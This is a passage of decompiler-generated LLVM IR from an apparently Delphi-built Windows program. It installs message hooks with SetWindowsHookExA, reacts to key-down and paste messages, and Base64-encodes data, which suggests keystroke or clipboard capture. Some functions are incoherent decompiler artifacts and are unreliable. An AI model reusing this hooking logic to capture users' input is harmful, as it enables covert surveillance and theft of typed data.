define i32 @function_4051a3() local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !709
  ret i32 %0, !insn.addr !709
}

define i32 @function_4051a8() local_unnamed_addr {
dec_label_pc_4051a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !710
}

define i32 @function_4051aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4051aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !711
}

define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051b0:
  %esp.0.reg2mem = alloca i32, !insn.addr !712
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !713
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !713
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !713
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !714
  %3 = call i32 @function_4071c0(), !insn.addr !715
  %4 = icmp eq i32 %3, 0, !insn.addr !716
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !717
  br i1 %4, label %dec_label_pc_405214, label %dec_label_pc_4051d1, !insn.addr !717

dec_label_pc_4051d1:                              ; preds = %dec_label_pc_4051b0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !718
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405238 to i32*), i8* null, i8* %5), !insn.addr !719
  %7 = ptrtoint i32* %6 to i32, !insn.addr !719
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !720
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !720
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !721
  %10 = icmp eq i1 %9, false, !insn.addr !722
  br i1 %10, label %dec_label_pc_40520f, label %dec_label_pc_4051ec, !insn.addr !723

dec_label_pc_4051ec:                              ; preds = %dec_label_pc_4051d1
  %11 = call i32 @function_407020(), !insn.addr !724
  %12 = call i32 @"@LStrAsg"(), !insn.addr !725
  %13 = call i32 @function_407348(), !insn.addr !726
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !727
  br label %dec_label_pc_405214, !insn.addr !727

dec_label_pc_40520f:                              ; preds = %dec_label_pc_4051d1
  %14 = call i32 @function_40747c(), !insn.addr !728
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !728
  br label %dec_label_pc_405214, !insn.addr !728

dec_label_pc_405214:                              ; preds = %dec_label_pc_40520f, %dec_label_pc_4051ec, %dec_label_pc_4051b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !729
  %16 = load i32, i32* %15, align 4, !insn.addr !729
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !730
  %17 = add i32 %esp.0.reload, 8, !insn.addr !731
  %18 = inttoptr i32 %17 to i32*, !insn.addr !731
  store i32 4215345, i32* %18, align 4, !insn.addr !731
  %19 = call i32 @"@LStrClr"(), !insn.addr !732
  ret i32 %19, !insn.addr !733
}

define i32 @function_40522a() local_unnamed_addr {
dec_label_pc_40522a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !734
  ret i32 %0, !insn.addr !734
}

define i32 @function_40522f() local_unnamed_addr {
dec_label_pc_40522f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !735
}

define i32 @function_405231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405231:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !736
}

define i32 @function_405235() local_unnamed_addr {
dec_label_pc_405235:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !737
  %8 = inttoptr i32 %4 to i8*, !insn.addr !737
  store i8 %7, i8* %8, align 1, !insn.addr !737
  %9 = add i32 %2, 111, !insn.addr !738
  %10 = inttoptr i32 %9 to i8*, !insn.addr !738
  %11 = load i8, i8* %10, align 1, !insn.addr !738
  %12 = load i32, i32* %eax, align 4, !insn.addr !738
  %13 = trunc i32 %12 to i8, !insn.addr !738
  %14 = add i8 %11, %13, !insn.addr !738
  store i8 %14, i8* %10, align 1, !insn.addr !738
  %15 = trunc i32 %3 to i16, !insn.addr !739
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !739
  %17 = inttoptr i32 %0 to i32*, !insn.addr !739
  store i32 %16, i32* %17, align 4, !insn.addr !739
  %18 = add i32 %0, 66, !insn.addr !740
  %19 = inttoptr i32 %18 to i64*, !insn.addr !740
  %20 = load i64, i64* %19, align 4, !insn.addr !740
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !740
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !741
  %22 = load i8, i8* %5, align 4, !insn.addr !742
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !742
  %25 = add i8 %22, %24, !insn.addr !742
  %26 = inttoptr i32 %23 to i8*, !insn.addr !742
  store i8 %25, i8* %26, align 1, !insn.addr !742
  %27 = add i32 %21, -117, !insn.addr !743
  %28 = inttoptr i32 %27 to i8*, !insn.addr !743
  %29 = load i8, i8* %28, align 1, !insn.addr !743
  %30 = trunc i32 %3 to i8, !insn.addr !743
  %31 = add i8 %29, %30, !insn.addr !743
  store i8 %31, i8* %28, align 1, !insn.addr !743
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !744
  %33 = add i32 %21, 16, !insn.addr !745
  %34 = inttoptr i32 %33 to i32*, !insn.addr !745
  %35 = load i32, i32* %34, align 4, !insn.addr !745
  %36 = add i32 %21, 12, !insn.addr !746
  %37 = inttoptr i32 %36 to i32*, !insn.addr !746
  %38 = load i32, i32* %37, align 4, !insn.addr !746
  %39 = add i32 %21, 8, !insn.addr !747
  %40 = inttoptr i32 %39 to i32*, !insn.addr !747
  %41 = load i32, i32* %40, align 4, !insn.addr !747
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !748
  %43 = inttoptr i32 %42 to i32*, !insn.addr !749
  %44 = load i32, i32* %43, align 4, !insn.addr !749
  %45 = icmp eq i32 %44, 0, !insn.addr !749
  %46 = icmp eq i1 %45, false, !insn.addr !750
  %47 = icmp eq i32 %41, 0, !insn.addr !751
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !752
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_40526b, label %dec_label_pc_40529a, !insn.addr !753

dec_label_pc_40526b:                              ; preds = %dec_label_pc_405235
  store i32 %35, i32* %eax, align 4, !insn.addr !754
  %51 = add i32 %35, 4, !insn.addr !755
  %52 = inttoptr i32 %51 to i32*, !insn.addr !755
  %53 = load i32, i32* %52, align 4, !insn.addr !755
  switch i32 %53, label %dec_label_pc_40529a [
    i32 256, label %dec_label_pc_405282
    i32 770, label %dec_label_pc_405293
  ]

dec_label_pc_405282:                              ; preds = %dec_label_pc_40526b
  %54 = call i32 @function_404fc0(i32 %2, i32 %1, i32 %0), !insn.addr !756
  br label %dec_label_pc_40529a, !insn.addr !757

dec_label_pc_405293:                              ; preds = %dec_label_pc_40526b
  %55 = call i32 @function_4050e4(i32 %2, i32 %1, i32 %0), !insn.addr !758
  br label %dec_label_pc_40529a, !insn.addr !758

dec_label_pc_40529a:                              ; preds = %dec_label_pc_405235, %dec_label_pc_40526b, %dec_label_pc_405293, %dec_label_pc_405282
  %56 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !759
  %57 = inttoptr i32 %35 to i32*, !insn.addr !760
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !760
  ret i32 %58, !insn.addr !761
}

define i32 @function_4052b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4052b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !762
  %5 = icmp eq i1 %4, false, !insn.addr !763
  %6 = icmp eq i32 %arg3, 0, !insn.addr !764
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4052ce, label %dec_label_pc_4052e0, !insn.addr !765

dec_label_pc_4052ce:                              ; preds = %dec_label_pc_4052b0
  %8 = add i32 %arg1, 8, !insn.addr !766
  %9 = inttoptr i32 %8 to i32*, !insn.addr !766
  %10 = load i32, i32* %9, align 4, !insn.addr !766
  %11 = icmp eq i32 %10, 2, !insn.addr !767
  %12 = icmp eq i1 %11, false, !insn.addr !768
  br i1 %12, label %dec_label_pc_4052e0, label %dec_label_pc_4052d8, !insn.addr !768

dec_label_pc_4052d8:                              ; preds = %dec_label_pc_4052ce
  %13 = call i32 @function_4051b0(i32 %1, i32 %2, i32 %0), !insn.addr !769
  br label %dec_label_pc_4052e0, !insn.addr !769

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052d8, %dec_label_pc_4052ce
  %14 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !770
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !771
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !771
  ret i32 %16, !insn.addr !772
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215364 to i32*), i32 3), !insn.addr !773
  %2 = ptrtoint i32* %1 to i32, !insn.addr !773
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !774
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215472 to i32*), i32 4), !insn.addr !775
  %5 = ptrtoint i32* %4 to i32, !insn.addr !775
  store i32 %5, i32* @global_var_4096b0, align 4, !insn.addr !776
  ret i32 %5, !insn.addr !777
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %0 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !778
  %1 = inttoptr i32 %0 to i32*, !insn.addr !779
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !779
  %3 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !780
  %4 = inttoptr i32 %3 to i32*, !insn.addr !781
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !781
  %6 = sext i1 %5 to i32, !insn.addr !781
  ret i32 %6, !insn.addr !782
}

define i32 @function_405348() local_unnamed_addr {
dec_label_pc_405348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !783
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !783
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !783
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !784
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !785
  %3 = add i32 %2, 1, !insn.addr !785
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !785
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !786
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !787
  ret i32 0, !insn.addr !788
}

define i32 @function_40536d() local_unnamed_addr {
dec_label_pc_40536d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !789
  ret i32 %0, !insn.addr !789
}

define i32 @function_405372() local_unnamed_addr {
dec_label_pc_405372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !790
}

define i32 @function_405374(i32 %arg1) local_unnamed_addr {
dec_label_pc_405374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !791
}

define i32 @function_405378() local_unnamed_addr {
dec_label_pc_405378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !792
  %2 = add i32 %1, -1, !insn.addr !792
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !792
  ret i32 %0, !insn.addr !793
}

define i32 @function_405383(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405383:
  %storemerge.reg2mem = alloca i32, !insn.addr !794
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !794
  %5 = inttoptr i32 %3 to i32*, !insn.addr !794
  store i32 %4, i32* %5, align 4, !insn.addr !794
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !795
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !795
  %10 = add i8 %7, %9, !insn.addr !795
  %11 = inttoptr i32 %8 to i8*, !insn.addr !795
  store i8 %10, i8* %11, align 1, !insn.addr !795
  %12 = load i32, i32* %eax, align 4, !insn.addr !796
  store i32 %arg1, i32* %eax, align 4, !insn.addr !797
  %13 = add i32 %12, 99, !insn.addr !798
  %14 = inttoptr i32 %13 to i64*, !insn.addr !798
  %15 = load i64, i64* %14, align 4, !insn.addr !798
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !798
  %17 = add i32 %16, -2, !insn.addr !799
  %18 = inttoptr i32 %17 to i16*, !insn.addr !799
  store i16 27241, i16* %18, align 2, !insn.addr !799
  %19 = mul i32 %2, 2, !insn.addr !800
  %20 = add i32 %2, 110, !insn.addr !800
  %21 = add i32 %20, %19, !insn.addr !800
  %22 = inttoptr i32 %21 to i32*, !insn.addr !800
  %23 = load i32, i32* %22, align 4, !insn.addr !800
  %24 = sext i32 %23 to i64, !insn.addr !800
  %25 = mul nsw i64 %24, 111, !insn.addr !800
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !800
  %28 = icmp eq i64 %25, %27, !insn.addr !800
  br i1 %28, label %dec_label_pc_4053b5, label %dec_label_pc_405424, !insn.addr !801

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %29 = icmp eq i32 %0, 0, !insn.addr !802
  br i1 %29, label %dec_label_pc_40542c, label %dec_label_pc_4053b9, !insn.addr !803

dec_label_pc_4053b9:                              ; preds = %dec_label_pc_4053b5
  %30 = icmp slt i32 %0, 0, !insn.addr !802
  br i1 %30, label %dec_label_pc_405434, label %dec_label_pc_4053bb, !insn.addr !804

dec_label_pc_4053bb:                              ; preds = %dec_label_pc_4053b9
  %31 = trunc i32 %0 to i8, !insn.addr !802
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !549, !insn.addr !802
  %33 = and i8 %32, 1, !insn.addr !802
  %34 = icmp eq i8 %33, 0, !insn.addr !802
  br i1 %34, label %dec_label_pc_4053ed, label %dec_label_pc_4053bd, !insn.addr !805

dec_label_pc_4053bd:                              ; preds = %dec_label_pc_4053bb
  %35 = add i32 %12, -1, !insn.addr !796
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !806
  %37 = load i32, i32* %36, align 4, !insn.addr !806
  %38 = xor i32 %37, %1, !insn.addr !806
  store i32 %38, i32* %36, align 4, !insn.addr !806
  %39 = add i32 %1, 959985462, !insn.addr !807
  %40 = inttoptr i32 %39 to i32*, !insn.addr !807
  %41 = load i32, i32* %40, align 4, !insn.addr !807
  %42 = xor i32 %41, %1, !insn.addr !807
  %43 = add i32 %16, -38, !insn.addr !808
  %44 = inttoptr i32 %43 to i32*, !insn.addr !808
  store i32 %35, i32* %44, align 4, !insn.addr !808
  %45 = add i32 %16, -42, !insn.addr !809
  %46 = inttoptr i32 %45 to i32*, !insn.addr !809
  store i32 %42, i32* %46, align 4, !insn.addr !809
  %47 = add i32 %16, -22, !insn.addr !810
  %48 = inttoptr i32 %47 to i32*, !insn.addr !810
  store i32 0, i32* %48, align 4, !insn.addr !810
  %49 = add i32 %16, -26, !insn.addr !811
  %50 = inttoptr i32 %49 to i32*, !insn.addr !811
  store i32 0, i32* %50, align 4, !insn.addr !811
  %51 = add i32 %16, -30, !insn.addr !812
  %52 = inttoptr i32 %51 to i32*, !insn.addr !812
  store i32 0, i32* %52, align 4, !insn.addr !812
  %53 = add i32 %16, -34, !insn.addr !813
  %54 = inttoptr i32 %53 to i32*, !insn.addr !813
  store i32 0, i32* %54, align 4, !insn.addr !813
  %55 = add i32 %16, -6, !insn.addr !814
  %56 = inttoptr i32 %55 to i32*, !insn.addr !814
  store i32 %arg3, i32* %56, align 4, !insn.addr !814
  %57 = add i32 %16, -46, !insn.addr !815
  %58 = inttoptr i32 %57 to i32*, !insn.addr !815
  store i32 %17, i32* %58, align 4, !insn.addr !815
  ret i32 0, !insn.addr !815

dec_label_pc_4053ed:                              ; preds = %dec_label_pc_4053bb
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !816
  %60 = trunc i64 %25 to i32, !insn.addr !800
  %61 = load i32, i32* %eax, align 4, !insn.addr !817
  %62 = add i32 %61, 1, !insn.addr !817
  %63 = mul i32 %59, 8, !insn.addr !818
  %64 = add i32 %59, 48, !insn.addr !818
  %65 = add i32 %64, %63, !insn.addr !818
  %66 = inttoptr i32 %65 to i8*, !insn.addr !818
  %67 = load i8, i8* %66, align 4, !insn.addr !818
  %68 = udiv i32 %62, 256, !insn.addr !818
  %69 = trunc i32 %68 to i8, !insn.addr !818
  %70 = add i8 %67, %69, !insn.addr !818
  store i8 %70, i8* %66, align 4, !insn.addr !818
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !819
  %71 = call i32 @"@LStrClr"(), !insn.addr !820
  %72 = call i32 @function_4034c8(), !insn.addr !821
  %73 = add i32 %60, -8, !insn.addr !822
  %74 = inttoptr i32 %73 to i32*, !insn.addr !822
  store i32 %72, i32* %74, align 4, !insn.addr !822
  %75 = ashr i32 %72, 31, !insn.addr !823
  %76 = zext i32 %72 to i64, !insn.addr !824
  %77 = zext i32 %75 to i64, !insn.addr !824
  %78 = mul i64 %77, 4294967296, !insn.addr !824
  %79 = or i64 %78, %76, !insn.addr !824
  %80 = sdiv i64 %79, 3, !insn.addr !824
  %81 = trunc i64 %80 to i32, !insn.addr !824
  store i32 %81, i32* %eax, align 4, !insn.addr !824
  %82 = srem i64 %79, 3, !insn.addr !824
  %83 = trunc i64 %82 to i32, !insn.addr !824
  %84 = icmp eq i32 %83, 0, !insn.addr !825
  %85 = icmp eq i1 %84, false, !insn.addr !826
  br i1 %85, label %dec_label_pc_405423, label %dec_label_pc_405416, !insn.addr !826

dec_label_pc_405416:                              ; preds = %dec_label_pc_4053ed
  %86 = load i32, i32* %74, align 4, !insn.addr !827
  %87 = ashr i32 %86, 31, !insn.addr !828
  %88 = zext i32 %86 to i64, !insn.addr !829
  %89 = zext i32 %87 to i64, !insn.addr !829
  %90 = mul i64 %89, 4294967296, !insn.addr !829
  %91 = or i64 %90, %88, !insn.addr !829
  %92 = sdiv i64 %91, 3, !insn.addr !829
  %93 = trunc i64 %92 to i32, !insn.addr !829
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !830
  br label %dec_label_pc_405430, !insn.addr !830

dec_label_pc_405423:                              ; preds = %dec_label_pc_4053ed
  ret i32 %81, !insn.addr !830

dec_label_pc_405424:                              ; preds = %dec_label_pc_405383
  %94 = load i32, i32* %eax, align 4, !insn.addr !831
  ret i32 %94, !insn.addr !831

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053b5
  %95 = load i32, i32* %eax, align 4, !insn.addr !832
  %96 = zext i32 %95 to i64, !insn.addr !832
  %97 = zext i32 %arg3 to i64, !insn.addr !832
  %98 = mul i64 %97, 4294967296, !insn.addr !832
  %99 = or i64 %98, %96, !insn.addr !832
  %100 = zext i32 %arg2 to i64, !insn.addr !832
  %101 = sdiv i64 %99, %100, !insn.addr !832
  %102 = trunc i64 %101 to i32, !insn.addr !832
  %103 = add i32 %102, 1, !insn.addr !833
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !833
  br label %dec_label_pc_405430, !insn.addr !833

dec_label_pc_405430:                              ; preds = %dec_label_pc_405416, %dec_label_pc_40542c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !834
  ret i32 %104, !insn.addr !835

dec_label_pc_405434:                              ; preds = %dec_label_pc_4053b9
  %105 = inttoptr i32 %1 to i32*, !insn.addr !836
  %106 = load i32, i32* %105, align 4, !insn.addr !836
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !836
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !837
  %109 = load i32, i32* %108, align 4, !insn.addr !837
  %110 = add i32 %109, %107, !insn.addr !837
  store i32 %110, i32* %108, align 4, !insn.addr !837
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !838
  %113 = inttoptr i32 %112 to i8*, !insn.addr !838
  %114 = load i8, i8* %113, align 1, !insn.addr !838
  %115 = trunc i32 %111 to i8, !insn.addr !838
  %116 = add i8 %114, %115, !insn.addr !838
  store i8 %116, i8* %113, align 1, !insn.addr !838
  %117 = load i32, i32* %eax, align 4, !insn.addr !839
  ret i32 %117, !insn.addr !839
}

define i32 @function_40543c() local_unnamed_addr {
dec_label_pc_40543c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !840
  %esp.0.reg2mem = alloca i32, !insn.addr !840
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !841
  %3 = inttoptr i32 %2 to i32*, !insn.addr !841
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !842
  %13 = inttoptr i32 %12 to i32*, !insn.addr !842
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !840
  br label %dec_label_pc_40543e, !insn.addr !840

dec_label_pc_40543e:                              ; preds = %dec_label_pc_405589, %dec_label_pc_40543c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !843
  %25 = add i32 %24, 3, !insn.addr !844
  %26 = load i32, i32* %3, align 4, !insn.addr !841
  %27 = icmp sgt i32 %25, %26, !insn.addr !845
  br i1 %27, label %dec_label_pc_4054de, label %dec_label_pc_40544f, !insn.addr !845

dec_label_pc_40544f:                              ; preds = %dec_label_pc_40543e
  %28 = add i32 %24, %0, !insn.addr !846
  %29 = inttoptr i32 %28 to i8*, !insn.addr !846
  %30 = load i8, i8* %29, align 1, !insn.addr !846
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !847
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !848
  %34 = inttoptr i32 %33 to i8*, !insn.addr !848
  %35 = load i8, i8* %34, align 1, !insn.addr !848
  store i8 %35, i8* %5, align 1, !insn.addr !849
  %36 = load i8, i8* %29, align 1, !insn.addr !850
  %37 = mul i8 %36, 16, !insn.addr !851
  %38 = and i8 %37, 48, !insn.addr !852
  %39 = add i32 %28, 1, !insn.addr !853
  %40 = inttoptr i32 %39 to i8*, !insn.addr !853
  %41 = load i8, i8* %40, align 1, !insn.addr !853
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !854
  %44 = zext i8 %43 to i32, !insn.addr !854
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !855
  %46 = inttoptr i32 %45 to i8*, !insn.addr !855
  %47 = load i8, i8* %46, align 1, !insn.addr !855
  store i8 %47, i8* %7, align 1, !insn.addr !856
  %48 = load i8, i8* %40, align 1, !insn.addr !857
  %49 = mul i8 %48, 4, !insn.addr !858
  %50 = and i8 %49, 60, !insn.addr !859
  %51 = add i32 %28, 2, !insn.addr !860
  %52 = inttoptr i32 %51 to i8*, !insn.addr !860
  %53 = load i8, i8* %52, align 1, !insn.addr !860
  %54 = udiv i8 %53, 64, !insn.addr !861
  %55 = or i8 %54, %50, !insn.addr !862
  %56 = zext i8 %55 to i32, !insn.addr !862
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !863
  %58 = inttoptr i32 %57 to i8*, !insn.addr !863
  %59 = load i8, i8* %58, align 1, !insn.addr !863
  store i8 %59, i8* %9, align 1, !insn.addr !864
  %60 = and i8 %53, 63, !insn.addr !865
  %61 = zext i8 %60 to i32, !insn.addr !865
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !866
  %63 = inttoptr i32 %62 to i8*, !insn.addr !866
  %64 = load i8, i8* %63, align 1, !insn.addr !866
  store i8 %64, i8* %11, align 1, !insn.addr !867
  br label %dec_label_pc_405589, !insn.addr !868

dec_label_pc_4054de:                              ; preds = %dec_label_pc_40543e
  %65 = add i32 %24, 2, !insn.addr !869
  %66 = icmp sgt i32 %65, %26, !insn.addr !870
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_40554d, label %dec_label_pc_4054e8, !insn.addr !870

dec_label_pc_4054e8:                              ; preds = %dec_label_pc_4054de
  %76 = mul i8 %75, 16, !insn.addr !871
  %77 = and i8 %76, 48, !insn.addr !872
  %78 = add i32 %67, 1, !insn.addr !873
  %79 = inttoptr i32 %78 to i8*, !insn.addr !873
  %80 = load i8, i8* %79, align 1, !insn.addr !873
  %81 = zext i8 %80 to i32, !insn.addr !873
  %82 = udiv i8 %80, 16, !insn.addr !874
  %83 = or i8 %82, %77, !insn.addr !875
  %84 = zext i8 %83 to i32, !insn.addr !875
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !876
  %86 = inttoptr i32 %85 to i8*, !insn.addr !876
  %87 = load i8, i8* %86, align 1, !insn.addr !876
  store i8 %87, i8* %7, align 1, !insn.addr !877
  %88 = mul i32 %81, 4, !insn.addr !878
  %89 = and i32 %88, 60, !insn.addr !879
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !880
  %91 = inttoptr i32 %90 to i8*, !insn.addr !880
  %92 = load i8, i8* %91, align 4, !insn.addr !880
  store i8 %92, i8* %9, align 1, !insn.addr !881
  store i8 61, i8* %11, align 1, !insn.addr !882
  br label %dec_label_pc_405589, !insn.addr !883

dec_label_pc_40554d:                              ; preds = %dec_label_pc_4054de
  %93 = zext i8 %75 to i32, !insn.addr !884
  %94 = mul i32 %93, 16, !insn.addr !885
  %95 = and i32 %94, 48, !insn.addr !886
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !887
  %97 = inttoptr i32 %96 to i8*, !insn.addr !887
  %98 = load i8, i8* %97, align 16, !insn.addr !887
  store i8 %98, i8* %7, align 1, !insn.addr !888
  store i8 61, i8* %9, align 1, !insn.addr !889
  store i8 61, i8* %11, align 1, !insn.addr !890
  br label %dec_label_pc_405589, !insn.addr !890

dec_label_pc_405589:                              ; preds = %dec_label_pc_40554d, %dec_label_pc_4054e8, %dec_label_pc_40544f
  %99 = load i32, i32* %13, align 4, !insn.addr !842
  %100 = inttoptr i32 %99 to i32*, !insn.addr !891
  %101 = load i32, i32* %100, align 4, !insn.addr !891
  %102 = add i32 %esp.0.reload, -4, !insn.addr !891
  %103 = inttoptr i32 %102 to i32*, !insn.addr !891
  store i32 %101, i32* %103, align 4, !insn.addr !891
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !892
  %105 = load i32, i32* %15, align 4, !insn.addr !893
  %106 = add i32 %esp.0.reload, -8, !insn.addr !893
  %107 = inttoptr i32 %106 to i32*, !insn.addr !893
